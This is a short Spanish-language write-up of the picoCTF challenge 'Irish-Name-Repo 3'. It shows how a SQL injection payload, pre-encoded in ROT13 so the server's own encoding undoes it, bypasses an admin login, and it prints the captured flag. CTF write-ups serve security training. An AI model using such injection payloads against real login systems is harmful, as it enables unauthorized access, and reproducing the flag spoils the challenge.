## Nombre del reto:
Irish-Name-Repo 3

## Objetivo:
There is a secure website running at https://jupiter.challenges.picoctf.org/problem/40742/ (link) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Solución:
Intentamos con cualquier password pero nos damos cuenta que el password esta encirptado

password: password
SQL query: SELECT * FROM admin where password = 'cnffjbeq'

si inyectamos la sentencia ' or 1= =1;' nos la encripta en root 13, entonces solo
convertimos esa sentencia en root13 y nos da como resultado:
' be 1= =1;
con la cual al hacer la convercion a root 13 ahora si estamos inyectando la sentencia 
' or 1= =1;'

password: ' be 1= =1;
SQL query: SELECT * FROM admin where password = '' or 1= =1;'
*nota: los = son juntos**
Logged in!

Your flag is: ==picoCTF{3v3n_m0r3_SQL_4424e7af}==

## Referencias: